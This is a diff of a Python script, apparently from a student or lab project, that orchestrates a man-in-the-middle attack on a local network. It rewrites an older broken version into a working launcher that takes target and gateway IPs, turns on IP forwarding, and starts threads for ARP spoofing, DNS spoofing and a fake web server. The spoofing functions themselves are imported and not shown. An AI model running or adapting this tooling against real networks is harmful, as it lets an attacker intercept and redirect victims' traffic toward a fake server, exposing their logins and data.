@@ -1,72 +1,62 @@
-#!/usr/bin/env python
-import sys
-import time
+#!/usr/bin/env python3.6
+
 import os
 import argparse
-from arp import spoof
+from arp import arp_spoof
 from dns import dns_spoof
-from fake_server import do_GET
+from fake_server import start_server
 from scapy.all import get_if_hwaddr, getmacbyip
-import thread
-import threading
+import _thread as thread
 
-#python attack_executable.py -t Target_IP -g Gateway_IP -i Interface
-
-parser = argparse.ArgumentParser()
-
-#-t Target_IP  -g Gateway_IP -i Interface 
-parser.add_argument("-t", "--target", help="Target_IP")
-parser.add_argument("-g", "--gateway", help="Gateway_IP")
-parser.add_argument("-i", "--interface", help="Interface")
-
-args = parser.parse_args()
-
-if not (args.target and args.gateway and args.interface):
-    print("Wrong/insufficient input parameters to the command")
-    print(parser.format_help())
-    break
-
-# Create three threads as follows
-try:
-    run_event = threading.Event()
-    run_event.set()
-    t1 = thread.start_new_thread(spoof, ("Start thread for ARP Spoof", mac_attacker, mac_victim, ip_to_spoof, ip_victim, iface, ) )
-    t2 = thread.start_new_thread(dns_spoof, ("Start thread for DNS Spoof", , ) )
-    t3 = thread.start_new_thread(do_GET, ("Start thread for Fake Server", self, ) )
-except:
-    print "Error: unable to start thread"
-
+# python attack_executable.py -t Target_IP -g Gateway_IP -i Interface
 if __name__ == "__main__":
-    print("Enabling ip forwarding")
-    os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward")
-    # iface = "enp0s3"
-    iface = args.interface
-    mac_attacker = get_if_hwaddr(iface)
-    # Leon's victim
-    # ip_victim = "192.168.192.16"
-    # ip_victim = "192.168.192.7"
-    ip_victim = args.target
-    # Karolina's victim
-    # ip_victim = "192.168.0.39"
-    # mac_victim = get_mac(ip_victim, iface)
-    mac_victim = getmacbyip(ip_victim)
-    print(mac_victim)
-    # Leon's gateway
-    ip_to_spoof = args.gateway
-    # Karolina's gateway
-    # ip_to_spoof = "192.168.0.1"
+    parser = argparse.ArgumentParser()
 
-    while True:
-        print "Threads successfully closed"
-        spoof(mac_attacker, mac_victim, ip_to_spoof, ip_victim, iface)
-        time.sleep(1)
+    parser.add_argument("-t", "--target", help="Target_IP")
+    parser.add_argument("-g", "--gateway", help="Gateway_IP")
+    parser.add_argument("-i", "--interface", help="Interface")
+
+    args = parser.parse_args()
+
+    if not (args.target and args.gateway and args.interface):
+        print("Wrong/insufficient input parameters to the command")
+        print(parser.format_help())
+    else:
+        iface = args.interface
+        ip_victim = args.target
+        ip_to_spoof = args.gateway
+        mac_attacker = get_if_hwaddr(iface)
+        mac_victim = getmacbyip(ip_victim)
+
+        ip_forward_path = "/proc/sys/net/ipv4/ip_forward"
+
+        # Read value from ip_forward_path
+        ip_forward_original_status = os.popen("cat {}".format(ip_forward_path)).read()
+        if "0" in ip_forward_original_status:
+            print("Enabling ip forwarding")
+            os.system("echo 1 > {}".format(ip_forward_path))
+
+        # Create three threads as follows
+        try:
+            arp_args = (mac_attacker, mac_victim, ip_to_spoof, ip_victim, iface,)
+
+            t1 = thread.start_new_thread(arp_spoof, arp_args)
+            t2 = thread.start_new_thread(dns_spoof, (iface,))
+            t3 = thread.start_new_thread(start_server, (iface,))
+
+            print("Started threads")
+        except Exception:
+            print("Error: unable to start thread")
+            import traceback
+            print(traceback.format_exc())
+
+        try:
+            # We need to keep this function alive to keep the threads running
+            while True:
+                pass
         except KeyboardInterrupt:
-            print ("Attempt to close threads")
-            run_event.clear()
-            t1.join()
-            t2.join()
-            t3.join()
+            print("\nReceived KeyboardInterrupt: stopping threads")
 
-
-
-
+            if "0" in ip_forward_original_status:
+                print("Disabling ip forwarding")
+                os.system("echo 0 > {}".format(ip_forward_path))
